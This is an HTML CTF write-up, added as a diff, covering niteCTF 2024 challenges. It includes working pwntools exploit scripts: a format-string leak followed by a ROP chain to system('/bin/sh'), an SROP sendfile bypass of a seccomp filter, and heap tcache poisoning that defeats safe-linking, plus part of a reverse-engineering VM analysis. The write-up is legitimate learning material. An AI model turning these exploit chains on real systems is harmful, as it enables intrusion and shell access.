@@ -1,0 +1,1046 @@
+<!doctype html> <html lang=en > <meta charset=UTF-8 > <meta name=viewport  content="width=device-width, initial-scale=1"> <link rel=stylesheet  href="/wednesday/libs/katex/katex.min.css"> <link rel=stylesheet  href="/wednesday/libs/highlight/styles/base16/chalk.min.css" /> <link rel=stylesheet  href="/wednesday/css/franklin.css" /> <link rel=stylesheet  href="/wednesday/css/tufte.css" /> <link rel=stylesheet  href="/wednesday/css/latex.css" /> <link rel=stylesheet  href="/wednesday/css/adjust.css" /> <link rel=icon  href="/wednesday/assets/favicon.png" /> <title>niteCTF 2024</title> <div id=layout > <div id=menu > <ul> <li><a href="/wednesday/">home</a> <li><a href="/wednesday/about/">about</a> <li><a href="/wednesday/ctf/">ctf</a> </ul> </div> <div id=main > <div class=franklin-content ><h1 id=nitectf_2024 ><a href="#nitectf_2024" class=header-anchor >niteCTF 2024</a></h1> <p>It&#39;s the end of the year, which means it&#39;s time for another niteCTF&#33;</p> <p>As always, a massive thank you to <a href="https://cryptonitemit.in/">Team Cryptonite</a> for hosting.</p> <div class=franklin-toc ><ol><li><a href="#print_the_gifts_pwn">Print the Gifts &#40;pwn&#41;</a><li><a href="#mixed_signals_pwn">Mixed Signals &#40;pwn&#41;</a><li><a href="#chaterine_pwn">Chaterine &#40;pwn&#41;</a><li><a href="#gate_keeping_rev">Gate Keeping &#40;rev&#41;</a><li><a href="#r_stands_alone_crypto">R Stands Alone &#40;crypto&#41;</a><li><a href="#import_random_crypto">Import Random &#40;crypto&#41;</a><li><a href="#quadrillion_matrices_crypto">Quadrillion Matrices &#40;crypto&#41;</a></ol></div> <h2 id=print_the_gifts_pwn ><a href="#print_the_gifts_pwn" class=header-anchor >Print the Gifts &#40;pwn&#41;</a></h2> <p>This challenge is a classic format string challenge, with NX, PIE, ASLR and full RELRO enabled.</p> <pre><code class=language-bash >❯ pwn checksec chall
+&#91;*&#93; &#39;/home/wednesday/code/ctf/ctf-archives/niteCTF/2024/print_the_gifts/chall&#39;
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No</code></pre> <p>Looking at the main function in Ghidra, we see that it allows us to call <code>printf&#40;&#41;</code> an unlimited number of times with a user-supplied format string.</p> <pre><code class=language-c >undefined8 main&#40;void&#41;
+
+&#123;
+  long *in_FS_OFFSET;
+  char yes_or_no;
+  char buf &#91;104&#93;;
+  long canary;
+  
+  canary &#61; in_FS_OFFSET&#91;5&#93;;
+  setvbuf&#40;stdin,&#40;char *&#41;0x0,2,0&#41;;
+  setvbuf&#40;stdout,&#40;char *&#41;0x0,2,0&#41;;
+  while&#40; true &#41; &#123;
+    yes_or_no &#61; &#39; &#39;;
+    printf&#40;&quot;What gift do you want from santa\n&gt;&quot;&#41;;
+    fgets&#40;buf,100,stdin&#41;;
+    printf&#40;&quot;Santa brought you a &quot;&#41;;
+    printf&#40;buf&#41;;
+    puts&#40;&quot;do you want another gift?\nEnter y or n:&quot;&#41;;
+    __isoc99_scanf&#40;&quot;&#37;c&quot;,&amp;yes_or_no&#41;;
+    if &#40;yes_or_no &#61;&#61; &#39;n&#39;&#41; break;
+    getchar&#40;&#41;;
+  &#125;
+  if &#40;canary &#33;&#61; in_FS_OFFSET&#91;5&#93;&#41; &#123;
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail&#40;&#41;;
+  &#125;
+  return 0;</code></pre> <p>To start off, we first send a series of <code>&#37;p</code>&#39;s in our format string to leak values off the stack. From this, we can recover the PIE base address, the <code>libc</code> base address as well as the location of the <code>main&#40;&#41;</code> stackframe&#39;s return address. </p> <pre><code class=language-python >def send_format_string&#40;conn, payload&#41;:
+conn.sendlineafter&#40;b&quot;What gift do you want from santa\n&gt;&quot;, payload&#41; prefix &#61;
+b&quot;Santa brought you a &quot; response &#61; conn.recvline_startswith&#40;prefix&#41;&#91;len&#40;prefix&#41;
+:&#93; return response
+
+
+def answer_continue&#40;conn, to_continue&#41;:
+    answer &#61; b&quot;y&quot; if to_continue else b&quot;n&quot;
+    conn.sendlineafter&#40;b&quot;Enter y or n:&quot;, answer&#41;
+
+conn &#61; connect&#40;&quot;print-the-gifts.chals.nitectf2024.live&quot;, 1337, ssl&#61;True&#41;
+
+# Step 1: Send a lot of &#37;p&#39;s and leak values off the stack
+offset_finder &#61; b&quot;:&quot;.join&#40;b&quot;&#37;p&quot; for _ in range&#40;100 // 3&#41;&#41;
+raw_response &#61; send_format_string&#40;conn, offset_finder&#41;
+for i, r in enumerate&#40;raw_response.decode&#40;&#41;.split&#40;&quot;:&quot;&#41;&#41;:
+    print&#40;f&quot;&#123;hex&#40;i&#41;&#125;: &#123;r&#125;&quot;&#41;
+response &#61; &#91;int&#40;x, 16&#41; if x &#33;&#61; &quot;&#40;nil&#41;&quot; else 0 for x in raw_response.decode&#40;&#41;.split&#40;&quot;:&quot;&#41;&#93;
+
+# Address of main leaked on the stack
+exe.address &#61; response&#91;0x13 &#43; 5&#93; - 0x1199
+info&#40;&quot;PIEBASE: &quot; &#43; hex&#40;exe.address&#41;&#41;
+
+# Address of libc
+libc.address &#61; response&#91;0x11 &#43; 5&#93; - 0x2724A
+info&#40;&quot;LIBC BASE: &quot; &#43; hex&#40;libc.address&#41;&#41;
+
+# Address of current stack frame&#39;s base pointer
+old_rbp &#61; response&#91;0x15 &#43; 5&#93;
+ret_addr &#61; old_rbp - 0x110
+info&#40;&quot;RETURN ADDRESS: &quot; &#43; hex&#40;ret_addr&#41;&#41;
+answer_continue&#40;conn, True&#41;</code></pre> <p>Next we make liberal use of <code>pwntool</code>&#39;s <code>FmtStr</code> class to construct an arbitrary write primitive. To ensure that payloads remain short and that writes always succeed, we perform writes in a cascading sequence of 2-byte nibbles rather than attempting to write everything using a single payload.</p> <pre><code class=language-python >def write_primitive&#40;baseaddress, towrite, format_string&#41;:
+    for i, b in enumerate&#40;towrite&#41;:
+        format_string.write&#40;baseaddress &#43; i, towrite&#91;i : i &#43; 2&#93;&#41;
+        format_string.execute_writes&#40;&#41;
+        
+def send_payload&#40;payload&#41;:
+    response &#61; send_format_string&#40;conn, payload&#41;
+    answer_continue&#40;conn, True&#41;
+    return response
+
+format_string &#61; FmtStr&#40;execute_fmt&#61;send_payload&#41;</code></pre> <p>Since RELRO is enabled, we use the write primitive to place a simple ROP-chain below our current stack frame, which will execute <code>system&#40;&quot;/bin/sh&quot;&#41;</code> whe nthe function returns.</p> <pre><code class=language-python >system &#61; libc.symbols.system
+binsh &#61; list&#40;libc.search&#40;b&quot;/bin/sh&quot;&#41;&#41;&#91;0&#93;
+rop &#61; ROP&#40;libc&#41;
+chain &#61; b&quot;&quot;
+chain &#43;&#61; p64&#40;rop.rdi.address&#41;
+chain &#43;&#61; p64&#40;binsh&#41;
+chain &#43;&#61; p64&#40;rop.find_gadget&#40;&#91;&quot;ret&quot;&#93;&#41;.address&#41;
+chain &#43;&#61; p64&#40;libc.symbols.system&#41;
+
+write_primitive&#40;ret_addr, chain, format_string&#41;
+
+# Exit the function to execute our ROP chain
+conn.sendline&#40;b&quot;a&quot;&#41;
+conn.sendline&#40;b&quot;n&quot;&#41;
+conn.interactive&#40;&#41;
+# nite&#123;0nLy_n4ugHty_k1d5_Use_&#37;n&#125;</code></pre> <h2 id=mixed_signals_pwn ><a href="#mixed_signals_pwn" class=header-anchor >Mixed Signals &#40;pwn&#41;</a></h2> <p>The binary we are provided with only has ASLR and NX protections enabled,</p> <pre><code class=language-bash >❯ pwn checksec chal
+&#91;*&#93; &#39;/home/wednesday/code/ctf/ctf-archives/niteCTF/2024/mixed_signal/chal&#39;
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE &#40;0x400000&#41;
+    Stripped:   No</code></pre> <p>and there is also a clear buffer overflow vulnerability.</p> <pre><code class=language-c >void vuln&#40;void&#41;
+&#123;
+  undefined buf &#91;8&#93;;
+  
+  read&#40;0,buf,300&#41;;
+  return;
+&#125;</code></pre> <p>Prior to <code>vuln&#40;&#41;</code> being called, the program will also open a file descriptor to the flag file as well as set a SECCOMP filter which restricts a lot of syscalls. Crucially however, <code>rt_sigreturn</code> is allowed by the filter so SROP techniques are still available to us.</p> <pre><code class=language-bash >❯ seccomp-tools dump ./chal 
+freakbob calling,pickup&#33;
+ line  CODE  JT   JF      K
+&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;
+ 0000: 0x20 0x00 0x00 0x00000004  A &#61; arch
+ 0001: 0x15 0x01 0x00 0xc000003e  if &#40;A &#61;&#61; ARCH_X86_64&#41; goto 0003
+ 0002: 0x06 0x00 0x00 0x00000000  return KILL
+ 0003: 0x20 0x00 0x00 0x00000000  A &#61; sys_number
+ 0004: 0x35 0x00 0x01 0x40000000  if &#40;A &lt; 0x40000000&#41; goto 0006
+ 0005: 0x06 0x00 0x00 0x00000000  return KILL
+ 0006: 0x15 0x00 0x01 0x0000000f  if &#40;A &#33;&#61; rt_sigreturn&#41; goto 0008
+ 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0008: 0x15 0x00 0x01 0x0000003c  if &#40;A &#33;&#61; exit&#41; goto 0010
+ 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0010: 0x15 0x00 0x01 0x000000e7  if &#40;A &#33;&#61; exit_group&#41; goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x15 0x00 0x01 0x00000000  if &#40;A &#33;&#61; read&#41; goto 0014
+ 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0014: 0x15 0x00 0x01 0x00000001  if &#40;A &#33;&#61; write&#41; goto 0016
+ 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0016: 0x15 0x00 0x01 0x00000028  if &#40;A &#33;&#61; sendfile&#41; goto 0018
+ 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0018: 0x06 0x00 0x00 0x00000000  return KILL</code></pre> <p>Using the buffer overflow, we first redirect execution back to the <code>vuln&#40;&#41;</code> function so that we can read 15 bytes from stdin. This will set <code>rax</code> to 15, which is the syscall number for <code>rt_sigreturn</code>. Afterwards, we jump to a syscall gadget to execute <code>rt_sigreturn</code>. </p> <pre><code class=language-python >conn &#61; connect&#40;&quot;mixed-signal.chals.nitectf2024.live&quot;, 1337, ssl&#61;True&#41;
+conn.recvline&#40;&#41;  # connection header
+
+rop &#61; ROP&#40;exe&#41;
+payload &#61; &quot;&quot;
+payload &#43;&#61; p64&#40;exe.symbols.vuln&#41;
+payload &#43;&#61; p64&#40;rop.find_gadget&#40;&#91;&quot;syscall&quot;&#93;&#41;.address&#41;</code></pre> <p>After executing <code>rt_sigreturn</code>, we can gain control over every register by placing a <code>SigreturnFrame</code> at the top of the stack. To exploit this for reading the flag, we set the registers to execute <code>sendfile&#40;stdout, flag_fd, 0&#41;</code>, where <code>flag_fd</code> is the file descriptor of the flag file. On a local run this will be file descriptor 3, since the flag is the fourth file descriptor open after <code>stdin, stdout, stderr</code>. On the remote however, the flag file descriptor will be file descriptor 5 since the remote process also inherits two file descriptors from its parent <code>socat</code> process when it was forked.</p> <pre><code class=language-python >frame &#61; SigreturnFrame&#40;&#41;
+frame.rax &#61; constants.SYS_sendfile
+frame.rdi &#61; 1  # out_fd
+frame.rsi &#61; 5  # in_fd
+frame.rdx &#61; 0  # offset
+frame.r10 &#61; 0xFF  # count
+frame.rip &#61; rop.find_gadget&#40;&#91;&quot;syscall&quot;&#93;&#41;.address
+frame.rsp &#61; exe.got.exit
+payload &#43;&#61; bytes&#40;frame&#41;</code></pre> <p>Finally, we execute our payload, being sure to supply 15 bytes to the second call of <code>read&#40;&#41;</code> so that <code>rax</code> is set accordingly</p> <pre><code class=language-python >rop_offset &#61; 16  # offset at which we control the return address
+payload &#61; fit&#40;&#123;rop_offset: payload&#125;, length&#61;300&#41;
+
+conn.send&#40;payload&#41;
+conn.send&#40;b&quot;A&quot; * 15&#41;
+conn.recvall&#40;&#41;
+# nite&#123;b0b&#39;5_s1gn4ls_h4v3_b33N_retUrN3D&#125;</code></pre> <h2 id=chaterine_pwn ><a href="#chaterine_pwn" class=header-anchor >Chaterine &#40;pwn&#41;</a></h2> <p>In this challenge, we have the ability to create, write and delete a set of heap allocated message buffers. For exploit mitigations, full RELRO, NX and PIE are enabled on the binary. </p> <pre><code class=language-bash >❯ pwn checksec chall &#91;*&#93;
+&#39;/home/wednesday/code/ctf/ctf-archives/niteCTF/2024/chaterine/handout/chall&#39;
+Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled
+PIE: PIE enabled Stripped: No</code></pre> <p>Looking at the <code>main&#40;&#41;</code> function in Ghidra, we can spot a few bugs, the most obvious of which being a use-after-free caused by not zeroing out the message pointers after deletion. There are also two format string vulnerabilities, one prior to the main loop, and another in the message writing functionality.</p> <pre><code class=language-c >void main&#40;void&#41;
+
+&#123;
+  int cmp;
+  char *buf;
+  long in_FS_OFFSET;
+  undefined4 choice;
+  int index;
+  char input_buffer &#91;12&#93;;
+  undefined local_2c;
+  undefined8 canary;
+  int index_copy;
+  
+  canary &#61; *&#40;undefined8 *&#41;&#40;in_FS_OFFSET &#43; 0x28&#41;;
+  setvbuf&#40;stdout,&#40;char *&#41;0x0,2,0&#41;;
+  setvbuf&#40;stdin,&#40;char *&#41;0x0,2,0&#41;;
+  setvbuf&#40;stderr,&#40;char *&#41;0x0,2,0&#41;;
+  fgets&#40;input_buffer,0xb,stdin&#41;;
+  local_2c &#61; 0;
+  printf&#40;&quot;Hello &quot;&#41;;
+                    /* Minor format string vulnerability */
+  printf&#40;input_buffer&#41;;
+  cmp &#61; strncmp&#40;input_buffer,&quot;spiderdrive&quot;,0xb&#41;;
+  if &#40;cmp &#33;&#61; 0&#41; &#123;
+    do &#123;
+      menu&#40;&#41;;
+      __isoc99_scanf&#40;&quot;&#37;d&quot;,&amp;choice&#41;;
+      fflush&#40;stdout&#41;;
+      switch&#40;choice&#41; &#123;
+      default:
+        printf&#40;&quot;Wrong input please try again&quot;&#41;;
+        break;
+      case 1:
+        printf&#40;&quot;Enter index:&quot;&#41;;
+        __isoc99_scanf&#40;&quot;&#37;d&quot;,&amp;index&#41;;
+        if &#40;&#40;index &lt; 0x10&#41; &amp;&amp; &#40;-1 &lt; index&#41;&#41; &#123;
+          printf&#40;&quot;Enter size:&quot;&#41;;
+          __isoc99_scanf&#40;&quot;&#37;d&quot;,SIZE &#43; index&#41;;
+          fflush&#40;stdout&#41;;
+          index_copy &#61; index;
+          if &#40;SIZE&#91;index&#93; &lt; 0xfff&#41; &#123;
+            buf &#61; &#40;char *&#41;malloc&#40;&#40;long&#41;SIZE&#91;index&#93;&#41;;
+            MESSAGES&#91;index_copy&#93; &#61; buf;
+          &#125;
+        &#125;
+        break;
+      case 2:
+        printf&#40;&quot;Enter index:&quot;&#41;;
+        __isoc99_scanf&#40;&quot;&#37;d&quot;,&amp;index&#41;;
+        fflush&#40;stdout&#41;;
+        if &#40;&#40;index &lt; 0x10&#41; &amp;&amp; &#40;-1 &lt; index&#41;&#41; &#123;
+                    /* Pointer is not zeroed. Can use after free. */
+          free&#40;MESSAGES&#91;index&#93;&#41;;
+        &#125;
+        break;
+      case 3:
+        printf&#40;&quot;Enter index:&quot;&#41;;
+        __isoc99_scanf&#40;&quot;&#37;d&quot;,&amp;index&#41;;
+        if &#40;&#40;index &lt; 0x10&#41; &amp;&amp; &#40;-1 &lt; index&#41;&#41; &#123;
+          getchar&#40;&#41;;
+          fgets&#40;MESSAGES&#91;index&#93;,SIZE&#91;index&#93;,stdin&#41;;
+                    /* Major format string vulnerability */
+          printf&#40;MESSAGES&#91;index&#93;&#41;;
+          printf&#40;&quot;has been written&quot;&#41;;
+        &#125;
+        break;
+      case 4:
+        cmp &#61; strncmp&#40;input_buffer,&quot;spiderdrive&quot;,0xb&#41;;
+        if &#40;cmp &#61;&#61; 0&#41; &#123;
+          printf&#40;&quot;Welcome admin here u go ur admin access&quot;&#41;;
+          system&#40;&quot;/bin/sh&quot;&#41;;
+        &#125;
+        break;
+      case 5:
+                    /* WARNING: Subroutine does not return */
+        exit&#40;0&#41;;
+      &#125;
+    &#125; while&#40; true &#41;;
+  &#125;
+  printf&#40;&quot;HAha cant let you in&quot;&#41;;
+                    /* WARNING: Subroutine does not return */
+  exit&#40;0&#41;;
+&#125;</code></pre> <p>Our goal is to exploit these vulnerabilities to modify a stack-local buffer. To begin, we use the first format string vulnerability to leak the address of the target buffer on the stack.</p> <pre><code class=language-python >def send_printf&#40;conn, name&#41;:
+    conn.sendline&#40;name&#41;
+    response &#61; conn.recvline_startswith&#40;b&quot;Hello &quot;&#41;.decode&#40;&#41;&#91;len&#40;b&quot;Hello &quot;&#41; :&#93;
+    return response
+
+
+def create_message&#40;conn, index, size&#41;:
+    conn.sendlineafter&#40;b&quot;&gt;&gt;&quot;, b&quot;1&quot;&#41;
+    conn.sendlineafter&#40;b&quot;Enter index:&quot;, str&#40;index&#41;.encode&#40;&#41;&#41;
+    conn.sendlineafter&#40;b&quot;Enter size:&quot;, str&#40;size&#41;.encode&#40;&#41;&#41;
+
+
+def delete_message&#40;conn, index&#41;:
+    conn.sendlineafter&#40;b&quot;&gt;&gt;&quot;, b&quot;2&quot;&#41;
+    conn.sendlineafter&#40;b&quot;Enter index:&quot;, str&#40;index&#41;.encode&#40;&#41;&#41;
+
+
+def write_message&#40;conn, index, message&#41;:
+    conn.sendlineafter&#40;b&quot;&gt;&gt;&quot;, b&quot;3&quot;&#41;
+    conn.sendlineafter&#40;b&quot;Enter index:&quot;, str&#40;index&#41;.encode&#40;&#41;&#41;
+    conn.sendline&#40;message&#41;
+    response &#61; conn.recvline&#40;&#41;
+    return response
+    
+conn &#61; connect&#40;&quot;chaterine.chals.nitectf2024.live&quot;, 1337, ssl&#61;True&#41;
+
+# Leaks a stack address, and hence address of target buffer
+printf_response &#61; send_printf&#40;conn, b&quot;&#37;13&#36;p&quot;&#41;
+target_buffer &#61; int&#40;printf_response, 16&#41; - 0x148
+print&#40;&quot;&amp;TARGET_BUFFER&quot;, hex&#40;target_buffer&#41;&#41;</code></pre> <p>Next we create a sentinel buffer at the top of the heap to prevent top-chunk consolidation.</p> <pre><code class=language-python >create_message&#40;conn, 0, 0x80&#41;</code></pre>
+<p>By writing into this buffer, we can also abuse the second format string vulnerability to read a heap address which was was left in a register from a previous operation. This allows us to determine the base address of the heap.</p>
+<pre><code class=language-python >response &#61; write_message&#40;conn, 0, &quot;&#37;3&#36;p&quot;&#41;
+heap_base &#61; int&#40;response, 16&#41; &amp; &#40;&#40;pow&#40;2, 64&#41; - 1&#41; ^ 0xFFF&#41;
+print&#40;&quot;HEAP BASE:&quot;, hex&#40;heap_base&#41;&#41;</code></pre>
+<p>Next we allocate two tcache-sized chunks, and free them so that the second chunk points to the first within the tcache.</p>
+<pre><code class=language-python >create_message&#40;conn, 1, 0x80&#41;  #  chunk1
+create_message&#40;conn, 2, 0x80&#41;  #  chunk2
+delete_message&#40;conn, 1&#41;  # tcache&#91;0x80&#93; &#61; chunk 1
+delete_message&#40;conn, 2&#41;  # tcache&#91;0x80&#93; &#61; chunk 2 -&gt; chunk 1</code></pre>
+<p>Since we know the base address of the heap, we can calculate the address of <code>chunk2</code> and hence bypass glibc&#39;s safe-linking mitigation.</p>
+<pre><code class=language-python >def protect_ptr&#40;pos, ptr&#41;:
+    # pos &#61; location of current chunk
+    # ptr &#61; location of chunk we want to point to
+    return &#40;pos &gt;&gt; 12&#41; ^ ptr
+    
+chunk2_pos &#61; heap_base &#43; 0x320
+print&#40;&quot;CHUNK 2 POS&quot;, hex&#40;chunk2_pos&#41;&#41;</code></pre>
+<p>Using this, we can overwrite the <code>fd</code> pointer of <code>chunk2</code> to point to the target buffer on the stack.</p>
+<pre><code class=language-python >write_message&#40;conn, 2, p64&#40;protect_ptr&#40;chunk2_pos, target_buffer&#41;&#41;&#41;</code></pre>
+<p>After this write, the tcache now looks like this,</p>
+<pre><code class=language-text >tcache&#91;0x80&#93;: chunk 2 -&gt; target buffer &#40;on stack&#41;</code></pre>
+<p>so by allocating two more <code>0x80</code> sized buffers, we will successfully allocate the target buffer into the <code>MESSAGES</code> array at index 4. From there, we can write our target string directly into the target buffer, and use option <code>4</code> at the main menu to get a shell.</p>
+<pre><code class=language-python ># Now message 4 points to the target buffer
+write_message&#40;conn, 4, b&quot;spiderdrive&quot;&#41;
+
+# And finally, use option 4 to get a shell
+conn.sendlineafter&#40;b&quot;&gt;&gt;&quot;, b&quot;4&quot;&#41;
+conn.interactive&#40;&#41;
+# nite&#123;P015on_IvY_m4h_G04t&#125;</code></pre>
+<h2 id=gate_keeping_rev ><a href="#gate_keeping_rev" class=header-anchor >Gate Keeping &#40;rev&#41;</a></h2>
+<p>This challenge implements a flag checker inside of a small virtual machine. As a general disclaimer, the original binary is stripped of any symbols, so all names assigned to functions, variables, registers and instructions below are ones I chose myself and likely won&#39;t line up with your names.</p>
+<p>The program begins with an unusual function prologue which Ghidra has a hard time dcompiling. Looking at the assembly we see that it repeatedly subtracts from <code>rsp</code> until a desired stackframe size is reached.</p>
+<pre><code class=language-asm >001028b8     ENDBR64
+001028bc     PUSH       RBP
+001028bd     MOV        RBP,RSP
+001028c0     LEA        R11&#61;&gt;buffer.field271_0x110,&#91;RSP &#43; -0x8000&#93;
+         loop:                                            XREF&#91;1&#93;:     001028d7&#40;j&#41;  
+001028c8     SUB        RSP,0x1000
+         
+001028cf     OR         qword ptr &#91;RSP&#93;&#61;&gt;buffer.field28943_0x7110,0x0
+         
+001028d4     CMP        RSP,R11
+001028d7     JNZ        loop</code></pre>
+<p>This large stackframe is used to store a large structure, which houses the state of our virtual machine. The program then proceeds to zero this memory, and copy a predefined sequence of instructions into the data section of the virtual machine state, preparing it for execution.</p>
+<pre><code class=language-c >memset&#40;&amp;buffer,0,0x8108&#41;;
+program &#61; &#40;undefined8 *&#41;::program;
+instructions &#61; &#40;undefined8 *&#41;&amp;buffer.instructions;
+                  /* Copy instructions into VM state buffer */
+for &#40;i &#61; 0x1a7; i &#33;&#61; 0; i &#61; i &#43; -1&#41; &#123;
+  *instructions &#61; *program;
+  program &#61; program &#43; &#40;ulong&#41;zero * -2 &#43; 1;
+  instructions &#61; instructions &#43; &#40;ulong&#41;zero * -2 &#43; 1;
+&#125;</code></pre>
+<p>The program then enters into its main loop, where the instruction pointer of the virtual machine is incremented continuously whilst instructions are read, decoded and executed.</p>
+<pre><code class=language-c >void main_loop&#40;vm_state *vm_state&#41;
+
+&#123;
+  short ip;
+  
+  do &#123;
+    ip &#61; vm_state-&gt;instruction_pointer;
+    vm_state-&gt;instruction_pointer &#61; ip &#43; 1;
+    execute&#40;vm_state,&#40;&amp;vm_state-&gt;instructions&#41;&#91;&#40;int&#41;ip&#93;&#41;;
+  &#125; while&#40; true &#41;;
+&#125;</code></pre>
+<p>The <code>execute&#40;&#41;</code> function takes the form of a large switch statement, which dispatches the corresponding opcode implementations based on the current instruction.</p>
+<pre><code class=language-c >void execute&#40;vm_state *state,byte instruction&#41;
+
+&#123;
+  if &#40;instruction &#61;&#61; 0xff&#41; &#123;
+    execute_ff_syscall&#40;state&#41;;
+    return;
+  &#125;
+  if &#40;instruction &#33;&#61; 0xdd&#41; &#123;
+    if &#40;instruction &lt; 0xde&#41; &#123;
+      if &#40;instruction &#61;&#61; 0xbf&#41; &#123;
+        execute_bf_bitwise_and&#40;state&#41;;
+        return;
+      &#125;
+      if &#40;instruction &lt; 0xc0&#41; &#123;
+        if &#40;instruction &#61;&#61; 0xb9&#41; &#123;
+          execute_b9_bitwise_or&#40;state&#41;;
+          return;
+        &#125;
+        if &#40;instruction &lt; 0xba&#41; &#123;
+          if &#40;instruction &lt; 0x99&#41; &#123;
+            if &#40;0x1f &lt; instruction&#41; &#123;
+              switch&#40;instruction&#41; &#123;
+              case 0x20:
+                execute_20_subtraction&#40;state&#41;;
+                return;
+              case 0x22:
+                execute_22_cmp&#40;state&#41;;
+                return;
+              case 0x24:
+                execute_24_store_at_offset&#40;state&#41;;
+                return;
+              case 0x26:
+                execute_26_bitwise_nor&#40;state&#41;;
+                return;
+              case 0x28:
+                execute_28_load_immediate&#40;state&#41;;
+                return;
+              case 0x2a:
+                execute_2a_load_from_memory&#40;state&#41;;
+                return;
+              case 0x2b:
+                execute_2b_jump_if&#40;state&#41;;
+                return;
+              case 0x2c:
+                execute_2c_nand&#40;state&#41;;
+                return;
+              case 0x30:
+                execute_30_addition&#40;state&#41;;
+                return;
+              case 0x5a:
+                execute_5a_left_shift&#40;state&#41;;
+                return;
+              case 0x5e:
+                execute_5e_multiplication&#40;state&#41;;
+                return;
+              case 0x67:
+                execute_67_right_shift&#40;state&#41;;
+                return;
+              case 0x72:
+                execute_72_juggle&#40;state&#41;;
+                return;
+              case 0x8f:
+                execute_8f_juggle_r&#40;state&#41;;
+                return;
+              case 0x91:
+                execute_91_nop&#40;state&#41;;
+                return;
+              case 0x98:
+                execute_98_negate&#40;state&#41;;
+                return;
+              &#125;
+            &#125;
+          &#125;
+          else if &#40;instruction &#61;&#61; 0xaa&#41; &#123;
+            execute_aa_mov&#40;state&#41;;
+            return;
+          &#125;
+        &#125;
+      &#125;
+    &#125;
+    exit_with_error&#40;&#41;;
+    return;
+  &#125;
+  execute_dd_atoi&#40;state&#41;;
+  return;
+&#125;</code></pre>
+<p>As a general overview, the VM implemented by the program has </p>
+<ul>
+<li><p>4 8-bit general purpose registers <code>r0, r1, r2, r3</code>.</p>
+
+<li><p>An 8-bit bitmap <code>flags</code> register for storing the result of comparison operations.</p>
+
+<li><p>A 16-bit instruction pointer.</p>
+
+<li><p>A 256-byte main memory region.</p>
+
+<li><p>A variable sized data region for storing instructions. </p>
+
+</ul>
+<p>Operations types are denoted using a single byte opcode, followed by one, two or three arguments which can be registers, memory addresses or immediates.</p>
+<p>To give a few examples, here are the VM implementations for</p>
+<ul>
+<li><p>the <code>ADD</code> instruction, which takes two arguments,</p>
+
+</ul>
+<pre><code class=language-c >void execute_30_addition&#40;vm_state *vm_state&#41;
+
+&#123;
+  char arg1;
+  char arg2;
+  short ip;
+  undefined reg1;
+  undefined reg2;
+  
+  ip &#61; vm_state-&gt;instruction_pointer;
+  vm_state-&gt;instruction_pointer &#61; ip &#43; 1;
+  reg1 &#61; &#40;&amp;vm_state-&gt;instructions&#41;&#91;&#40;int&#41;ip&#93;;
+  ip &#61; vm_state-&gt;instruction_pointer;
+  vm_state-&gt;instruction_pointer &#61; ip &#43; 1;
+  reg2 &#61; &#40;&amp;vm_state-&gt;instructions&#41;&#91;&#40;int&#41;ip&#93;;
+  arg1 &#61; load_from_register&#40;vm_state,reg1&#41;;
+  arg2 &#61; load_from_register&#40;vm_state,reg2&#41;;
+  store_register&#40;vm_state,reg1,arg2 &#43; arg1&#41;;
+  return;
+&#125;</code></pre>
+<ul>
+<li><p>the <code>LOAD</code> instruction, which reads a value off main memory</p>
+
+</ul>
+<pre><code class=language-c >void execute_2a_load_from_memory&#40;vm_state *vm_state&#41;
+&#123;
+  byte data;
+  short ip;
+  undefined reg1;
+  
+  ip &#61; vm_state-&gt;instruction_pointer;
+  vm_state-&gt;instruction_pointer &#61; ip &#43; 1;
+  reg1 &#61; &#40;&amp;vm_state-&gt;instructions&#41;&#91;&#40;int&#41;ip&#93;;
+  ip &#61; vm_state-&gt;instruction_pointer;
+  vm_state-&gt;instruction_pointer &#61; ip &#43; 1;
+  data &#61; load_from_offset&#40;vm_state,&#40;&amp;vm_state-&gt;instructions&#41;&#91;&#40;int&#41;ip&#93;&#41;;
+  store_register&#40;vm_state,reg1,data&#41;;
+  return;
+&#125;</code></pre>
+<ul>
+<li><p>the <code>LOADIMM</code> instruction, which loads an immediate value into a register</p>
+
+</ul>
+<pre><code class=language-c >void execute_28_load_immediate&#40;vm_state *vm_state&#41;
+
+&#123;
+  short ip;
+  undefined reg1;
+  
+  ip &#61; vm_state-&gt;instruction_pointer;
+  vm_state-&gt;instruction_pointer &#61; ip &#43; 1;
+  reg1 &#61; &#40;&amp;vm_state-&gt;instructions&#41;&#91;&#40;int&#41;ip&#93;;
+  ip &#61; vm_state-&gt;instruction_pointer;
+  vm_state-&gt;instruction_pointer &#61; ip &#43; 1;
+  store_register&#40;vm_state,reg1,&#40;&amp;vm_state-&gt;instructions&#41;&#91;&#40;int&#41;ip&#93;&#41;;
+  return;
+&#125;</code></pre>
+<p>With the understanding we now have of the virtual machine and the code it executes, we can write ourselves a small disassembler for the flag checker program embedded within the binary.</p>
+<pre><code class=language-python >#&#33;/usr/bin/env python3
+from enum import Enum
+
+class Instruction&#40;Enum&#41;:
+    IO &#61; 0xFF
+    AND &#61; 0xBF
+    OR &#61; 0xB9
+    SUB &#61; 0x20
+    CMP &#61; 0x22
+    STORE &#61; 0x24
+    NOR &#61; 0x26
+    LOADIMM &#61; 0x28
+    LOAD &#61; 0x2A
+    JUMPIF &#61; 0x2B
+    NAND &#61; 0x2C
+    ADD &#61; 0x30
+    LSHIFT &#61; 0x5A
+    MUL &#61; 0x5E
+    RSHIFT &#61; 0x67
+    JUGGLE &#61; 0x72
+    JUGGLE_R &#61; 0x8F
+    NOP &#61; 0x91
+    NEG &#61; 0x98
+    MOV &#61; 0xAA
+    ATOI &#61; 0xDD
+
+
+class IOOperation&#40;Enum&#41;:
+    WRITE &#61; 0x2E
